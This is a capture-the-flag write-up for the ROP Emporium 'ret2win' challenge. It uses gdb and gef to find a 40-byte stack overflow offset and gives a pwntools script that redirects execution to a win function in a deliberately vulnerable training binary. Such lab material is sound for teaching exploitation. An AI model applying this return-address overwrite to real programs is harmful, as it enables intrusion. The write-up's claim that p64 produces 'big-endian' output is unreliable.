# 1 Ret2win 

In this challenge you have to redirect execution to a function called ret2win
[challenge link](https://ropemporium.com/challenge/ret2win.html) using 64-bit binary.

## Understanding

In this challenge, we try to redirect the execution by inputing a malicious pattern (characters) in an input field that the running program asks for

## Recon

* First thing to do was to check the file:

```
$ file ret2win 
ret2win: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=19abc0b3bb228157af55b8e16af7316d54ab0597, not stripped
``` 

As we see it's a 64 bit binary, not stripped.

* Second thing was to check the binary security:

```

$ checksec ret2win 
[*] '/home/kali/Documents/CTFs/ropemporium/ret2win/ret2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

`No canary found` means that the there is no check on the stack before `RET` instruction (returning from a function).

`No PIE` means that the address won't change on each execution (position-independent executable is off).

* Last we can check the symbols to see the functions that this binray is calling including `main` and the function we're targetting `ret2win`, to do that we can use `readelf`
```
$ readelf -s ret2win | grep FUNC
```
`FUNC` cause we're only insterested in functions.

you'll see a lot of output but we're interested in these:
```
    35: 00000000004006e8   110 FUNC    LOCAL  DEFAULT   13 pwnme
    36: 0000000000400756    27 FUNC    LOCAL  DEFAULT   13 ret2win
```
`pwnme` is the function inside main that gets called, for example:
```
int main() {
	pawnme();
}
```
and `ret2win` is the target.

## Execution

Running the programs gives a string and then asks for input from the user

```
$ ./ret2win 
ret2win by ROP Emporium
x86_64

* For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> 
```

* Passing a long string gives a Seg Fault (segmentation fault), mean that this binary is exploitable:

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Thank you!
Segmentation fault
```
(Or)
```
$ python3 -c "print('A'*100)" | ./ret2win 
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> Thank you!
Segmentation fault
```

* Now we have to determine how many characters does it take to overflow and check the function that handled the user input.

by running strace we see that it's making a call to a function (read)

```
$ strace ./ret2win
 ...
read(0, "\n", 56)
 ...

```

By looking at read manual `$ man read` we see that read() function takes 3 arguments and the third one is `size_t count` (attempts to read up to `count` bytes)
```
 ...
SYNOPSIS
       #include <unistd.h>

       ssize_t read(int fd, void *buf, size_t count);

DESCRIPTION
       read() attempts to read up to count bytes from file descriptor fd into the buffer starting at buf.
 ...
```
In our case `count` is `56`

However, even that count is `56`, the maximum characters before hitting a seg fault is instead `40` (`40 + 16 = 50` we'll see later why).

Now we need to jump to gdb.

* Running gdb to examine the binary:

```
$ gdb -q ./ret2win

gef➤  
```
I used [gef](https://github.com/hugsy/gef) on gdb, cause it helps giving more output inside gdb, and you don't have to keep defining functions to call etc..

Disassembling main function:
```
gef➤  disass main
Dump of assembler code for function main:
   0x0000000000400697 <+0>:     push   rbp
   0x0000000000400698 <+1>:     mov    rbp,rsp
   0x000000000040069b <+4>:     mov    rax,QWORD PTR [rip+0x2009b6]        # 0x601058 <stdout@@GLIBC_2.2.5>
   0x00000000004006a2 <+11>:    mov    ecx,0x0
   0x00000000004006a7 <+16>:    mov    edx,0x2
   0x00000000004006ac <+21>:    mov    esi,0x0
   0x00000000004006b1 <+26>:    mov    rdi,rax
   0x00000000004006b4 <+29>:    call   0x4005a0 <setvbuf@plt>
   0x00000000004006b9 <+34>:    mov    edi,0x400808
   0x00000000004006be <+39>:    call   0x400550 <puts@plt>
   0x00000000004006c3 <+44>:    mov    edi,0x400820
   0x00000000004006c8 <+49>:    call   0x400550 <puts@plt>
   0x00000000004006cd <+54>:    mov    eax,0x0
   0x00000000004006d2 <+59>:    call   0x4006e8 <pwnme>
   0x00000000004006d7 <+64>:    mov    edi,0x400828
   0x00000000004006dc <+69>:    call   0x400550 <puts@plt>
   0x00000000004006e1 <+74>:    mov    eax,0x0
   0x00000000004006e6 <+79>:    pop    rbp
   0x00000000004006e7 <+80>:    ret    
End of assembler dump.
```
by examining the code, you can see it's making a call to `pwnme` function and it's not doing much.

let's check that function:

```
gef➤  disass pwnme
Dump of assembler code for function pwnme:
   0x00000000004006e8 <+0>:     push   rbp
   0x00000000004006e9 <+1>:     mov    rbp,rsp
   0x00000000004006ec <+4>:     sub    rsp,0x20
   0x00000000004006f0 <+8>:     lea    rax,[rbp-0x20]
   0x00000000004006f4 <+12>:    mov    edx,0x20
   0x00000000004006f9 <+17>:    mov    esi,0x0
   0x00000000004006fe <+22>:    mov    rdi,rax
   0x0000000000400701 <+25>:    call   0x400580 <memset@plt>
   0x0000000000400706 <+30>:    mov    edi,0x400838
   0x000000000040070b <+35>:    call   0x400550 <puts@plt>
   0x0000000000400710 <+40>:    mov    edi,0x400898
   0x0000000000400715 <+45>:    call   0x400550 <puts@plt>
   0x000000000040071a <+50>:    mov    edi,0x4008b8
   0x000000000040071f <+55>:    call   0x400550 <puts@plt>
   0x0000000000400724 <+60>:    mov    edi,0x400918
   0x0000000000400729 <+65>:    mov    eax,0x0
   0x000000000040072e <+70>:    call   0x400570 <printf@plt>
   0x0000000000400733 <+75>:    lea    rax,[rbp-0x20]
   0x0000000000400737 <+79>:    mov    edx,0x38
   0x000000000040073c <+84>:    mov    rsi,rax
   0x000000000040073f <+87>:    mov    edi,0x0
   0x0000000000400744 <+92>:    call   0x400590 <read@plt>
   0x0000000000400749 <+97>:    mov    edi,0x40091b
   0x000000000040074e <+102>:   call   0x400550 <puts@plt>
   0x0000000000400753 <+107>:   nop
   0x0000000000400754 <+108>:   leave  
   0x0000000000400755 <+109>:   ret    
End of assembler dump.
```

here you'll notice the call to the read function at the address `0x0000000000400744`

let's set a breakpoint at that address to see what's happening

```
gef➤  b \*0x0000000000400744
Breakpoint 1 at 0x400744
```
and then run our program

```
gef➤  r
```
once you run, it'll print the usual prompt and then hit the breakpoint before right calling `read` function.

now before we call the read function we need to create a pattern, you can do that in `gdb`:
```
gef➤  pattern create 70
[+] Generating a pattern of 70 bytes
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaa
[+] Saved as '$\_gef0'
```

i used 70 which generates that number of characters, and `70 > 56 > 40`. make sure you copy that pattern `aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaa`.

now you can check the stack to see the difference with later by typing
```
gef➤  x/1gx $rsp
```
`x/1gx` gives the content of the address which the stack pointer in this case `$rsp` 
before `/`
`x` for examine memory
after `/`
`g` for double word (cause the file is 64 bit)
`x` for hexadecimal

type `si` and then `fin` to call `read` (`si` one instruction further) and (`fin` go back from call function).

```
gef➤  si
 ...
gef➤  fin
Run till exit from #0  0x0000000000400596 in read@plt ()

```

Now it will ask for your input inside gdb, paste the pattern you copied earlier and type enter.

```
Run till exit from #0  0x0000000000400596 in read@plt ()
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaa
```
let's examine the stack again

```
gef➤  x/1gx $rsp
0x7fffffffe030: 0x6161616161616161
```

you'll notice it's different this time and if you're familliar with the `ASCII` table you're notice that `0x6161616161616161` is `aaaaaaaa` but in hex.

let's check:

```
gef➤  x/1s $rsp
0x7fffffffe030: "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaa\v\216\341\367\377\177"
```
that's our pattern, in the stack, which means that calling `read` function reads input from the user and loads it to the stack.
this time we used `s` instead of `gx` cause we need to print it as `string` (`s`).

let's continue the execution.

```
gef➤  c
```
we receive a `SIGSEGV` which is a segmentation fault.

again let's run the program and this time set the break point at `ret` instruction.
so:

```
gef➤  disass pwnme
Dump of assembler code for function pwnme:
   0x00000000004006e8 <+0>:     push   rbp
   0x00000000004006e9 <+1>:     mov    rbp,rsp
   0x00000000004006ec <+4>:     sub    rsp,0x20
   0x00000000004006f0 <+8>:     lea    rax,[rbp-0x20]
   0x00000000004006f4 <+12>:    mov    edx,0x20
   0x00000000004006f9 <+17>:    mov    esi,0x0
   0x00000000004006fe <+22>:    mov    rdi,rax
   0x0000000000400701 <+25>:    call   0x400580 <memset@plt>
   0x0000000000400706 <+30>:    mov    edi,0x400838
   0x000000000040070b <+35>:    call   0x400550 <puts@plt>
   0x0000000000400710 <+40>:    mov    edi,0x400898
   0x0000000000400715 <+45>:    call   0x400550 <puts@plt>
   0x000000000040071a <+50>:    mov    edi,0x4008b8
   0x000000000040071f <+55>:    call   0x400550 <puts@plt>
   0x0000000000400724 <+60>:    mov    edi,0x400918
   0x0000000000400729 <+65>:    mov    eax,0x0
   0x000000000040072e <+70>:    call   0x400570 <printf@plt>
   0x0000000000400733 <+75>:    lea    rax,[rbp-0x20]
   0x0000000000400737 <+79>:    mov    edx,0x38
   0x000000000040073c <+84>:    mov    rsi,rax
   0x000000000040073f <+87>:    mov    edi,0x0
   0x0000000000400744 <+92>:    call   0x400590 <read@plt>
   0x0000000000400749 <+97>:    mov    edi,0x40091b
   0x000000000040074e <+102>:   call   0x400550 <puts@plt>
   0x0000000000400753 <+107>:   nop
   0x0000000000400754 <+108>:   leave  
=> 0x0000000000400755 <+109>:   ret    
End of assembler dump.
```
set break point at `ret` (last line, see above)
```
gef➤  b *0x0000000000400755
Breakpoint 2 at 0x400755
```
and run
```
gef➤  r
```
we will hit the first break point before calling `read` 
so let's continue untill it hits `ret` breakpoint

```
gef➤  c
```

*it will wait for input again, so paste the same pattern from before and hit enter.*

now we're right before executing `ret` instruction.
we can check by typing:
```
gef➤  x/i $rip
=> 0x400755 <pwnme+109>:        ret 
```

`x` for examine memory.
`i` for instruction.
`ip` instruction pointer (r for 64-bit)

as we can see we're about to execute ret instruction.
we need to see what rsp is pointing to (stack pointer)

```
Note:
	to redirect the execution, we exploit how ret instruction works.
	when the program hit ret instruction in the execution, it jumps to
	whatever address is pointed to by rsp (stack pointer) and it 
	executes from there
	
	copy $rsp (stack pointer) ==to=> $rip (instruction pointer)
```

* Let's check the stack:

```
gef➤  x/gx $rsp
0x7fffffffe058: 0x6161616161616166
```
or
```
gef➤  x/s $rsp
0x7fffffffe058: "faaaaaaagaaaaaaa\v\216\341\367\377\177"
```

you'll notice now that the stack pointer now is not pointing to the begining of the pattern we passed, but instead to `0x6161616161616166` which is `faaaaaaa`

Now we know why there was a segmentation fault!
Its because the program was trying to jump to the address `0x6161616161616166` but this address is invalid so it gives an error instead.
so if we replace `faaaaaaa` by `BBBBBBBB` in the pattern that we passed it will point to `BBBBBBBB` which is `0x4242424242424242` instead. in other words, if we somehow pass a valid address, it will jump to that valid address, in our case we wanna jump to an address called `ret2win`.
let's examine `ret2win` address

```
gef➤  print ret2win
$1 = {<text variable, no debug info>} 0x400756 <ret2win>
```

ret2win address is `0x400756`.

so we can now send `Pattern + 0x400756` and to jump to that address.

to calculate the pattern offset before the return address we use gdb pattern so:

```
gef➤  pattern search faaaaaaa
[+] Searching 'faaaaaaa'
[+] Found at offset 33 (little-endian search) likely
[+] Found at offset 40 (big-endian search)
```

in our case it's `40` so `'A'*40 + 0x400756`, where `0x400756` is ret2win address


but first we need a way to convert that address, just like `0x6161616161616166` is `faaaaaaa`, we can't just paste it from the keyboard.

there is python tool for that, that can help us convert and interact with the binary called [pwntools](http://docs.pwntools.com/en/stable/) which we gonna use.

`Pattern = 40`
`ret2win address = 0x400756`

we can close gdb now

```
gef➤  q
$
```

## Writing the exploit:

* Using pwntools:

in a file we call [exploit.py](https://github.com/l0x539/CTFs-writeups/blob/master/ropemporium/ret2win/exploit.py) and using python3.

first we import:

```python3
from pwn import process, p64
```
`process` to run the file
`p64` to convert the address to latin-1 big-endian

opening and running the file with pwn.

```python3
# one line, great tool
p = process("./ret2win")
```

we craft the payload:

```python3
payload = b"A"*40         # generating 40 characters
payload += p64(0x400756)  # adding the converted ret2win address to the end
```

we recive the output from program until it asks for input:

```python3
print(p.recvuntil("> ").decode("latin-1")) # receiving
```

we send the payload that we crafted

```python3
p.sendline(payload)
```

we receive everything:

```python3
print(p.clean().decode("latin-1"))
```

running the script:

```
$ python3 exploit.py 
[+] Starting local process './ret2win': pid 21022
b"ret2win by ROP Emporium\nx86_64\n\nFor my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!\nWhat could possibly go wrong?\nYou there, may I have your input please? And don't worry about null bytes, we're using read()!\n\n> "
Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}

```

we got the flag by redirecting execution!

we can also also gain a shell instead of just calling that function, we'll learn that in next challenges.
